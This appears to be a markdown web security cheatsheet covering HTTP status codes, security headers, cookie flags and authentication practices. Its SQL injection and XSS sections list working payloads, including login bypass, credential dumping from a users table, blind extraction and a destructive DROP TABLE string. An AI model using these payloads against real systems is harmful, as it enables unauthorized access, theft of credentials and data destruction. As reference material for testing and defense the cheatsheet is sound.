<div align="center">

# Web Security Cheatsheet

</div>

---

## HTTP Status Codes

| Code | Meaning | Category |
|:----:|:--------|:---------|
| 200 | OK | Success |
| 201 | Created | Success |
| 301 | Moved Permanently | Redirect |
| 302 | Found | Redirect |
| 400 | Bad Request | Client Error |
| 401 | Unauthorized | Client Error |
| 403 | Forbidden | Client Error |
| 404 | Not Found | Client Error |
| 500 | Internal Server Error | Server Error |
| 503 | Service Unavailable | Server Error |

## SQL Injection Payloads

```
' OR 1=1 --                      Basic bypass
' OR '1'='1                      Alternative bypass
admin' --                        Login bypass
1 UNION SELECT NULL,NULL,NULL    Column count
1 UNION SELECT username,password FROM users--   Dump data
' AND 1=1--                      True condition
' AND 1=2--                      False condition
' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--   Blind
'; DROP TABLE users--            Destructive
' UNION SELECT table_name,NULL FROM information_schema.tables--  Enumerate
```

## XSS Payloads

```
<script>alert('XSS')</script>                    Basic
<img src=x onerror=alert('XSS')>                 Image error
<svg onload=alert('XSS')>                        SVG
<body onload=alert('XSS')>                       Body
<input onfocus=alert('XSS') autofocus>           Input
<marquee onstart=alert('XSS')>                   Marquee
<details open ontoggle=alert('XSS')>             Details
<video><source onerror=alert('XSS')>             Video
<a href=javascript:alert('XSS')>click</a>        Link
"><script>alert('XSS')</script>                  Break out of tag
' onmouseover='alert('XSS')                      Attribute escape
```

## Security Headers

```
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=()
```

## Cookie Security Flags

```
Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Strict

HttpOnly    - Prevents JavaScript access (XSS protection)
Secure      - Only sent over HTTPS
SameSite    - CSRF protection (Strict/Lax/None)
Path        - Restricts cookie scope
Domain      - Restricts cookie domain
Max-Age     - Expiration time in seconds
```

## Authentication Best Practices

```
✅ Use bcrypt/Argon2 for password hashing
✅ Implement rate limiting on login
✅ Use cryptographically random session IDs
✅ Regenerate session ID after login
✅ Set session timeout
✅ Implement MFA
✅ Use secure password reset flow
✅ Never store plaintext passwords
```
